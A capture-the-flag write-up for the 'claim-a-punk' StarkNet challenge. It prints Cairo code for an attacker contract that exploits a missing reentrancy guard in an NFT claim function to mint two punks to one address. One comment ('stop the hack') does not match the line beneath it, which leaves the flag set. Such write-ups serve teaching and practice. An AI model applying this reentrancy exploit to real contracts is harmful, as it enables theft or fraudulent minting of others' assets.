# `claim-a-punk`

## Number of points

436 (tied to the fourth easiest challenge of the CTF)

## Challenge victory condition

To solve this challenge, we need to figure out how to mint two punks at the same address. One way to solve this problem is to implement a reentrancy attack because the NFT contract called by the `claim` function is not protected against reentrancy.

## Challenge solution

To capture this flag, we developed a very simple smart-contract that will automatically be called by the NFT smart-contract when the `claim` function is called by the player. This smart-contract will first mint a punk for itself when the player calls it, then call the `claim` function again, mint a punk for the player, and finally transfer the first NFT minted to the player. In this way, once the transaction is accepted, the player will have 2 punks.

The smart-contract in charge of the [reentrancy attack](./public/contracts/attacker.cairo) must be deployed (using the [`reentrancy-contract`](./public/deploy/reentrancy-contract.js) script) before calling the [`solve`](./solve.js) script.

Here's the method the player will have to call to initiate the attack:

```cairo
func hack{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(addressContract: felt, addressUser: felt, addressPunk: felt) {
    alloc_locals;

    // enable hack
    _continue.write(1);

    let (currentContractAddress) = get_contract_address();

    // write the addresses of the user and the contract inside the storage (when TSTORE?)
    user.write(addressUser);
    target.write(addressContract);
    punk.write(addressPunk);

    // call claim for the first time -- this call will mint the first punk for this contract
    IClaimAPunk.claim(contract_address=addressContract, to=currentContractAddress);

    return();
}
```

Here's the method automatically called by the NFT smart-contract. The reentrancy attack happens here:

```cairo
func onERC721Received{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
        operator: felt, from_: felt, tokenId: Uint256, data_len: felt, data: felt*
    ) -> (selector: felt) {
    alloc_locals;
    let (isContinue) = _continue.read();

    if (isContinue == 0) {
        return (selector=IERC721_RECEIVER_ID);
    }

    // stop the hack -- safeguard against reentrancy loop
    _continue.write(1);

    let (_user) = user.read();
    let (isContinue) = _continue.read();
    let (_target) = target.read();
    let (currentContractAddress) = get_contract_address();

    // claim the token a second time -- this call mint a punk to the user
    IClaimAPunk.claim(contract_address=_target,to=_user);

    let (addressPunk) = punk.read();

    // transfer the initial token minted for this contract to the user
    I721.transferFrom(contract_address=addressPunk,from_=currentContractAddress,to=_user,tokenId=tokenId);

    return (selector=IERC721_RECEIVER_ID);
}
```

Both contracts (the one we developed to do the attack, and the one we want to attack) are in the contracts directory. Relevant ABIs are in the abis directory.
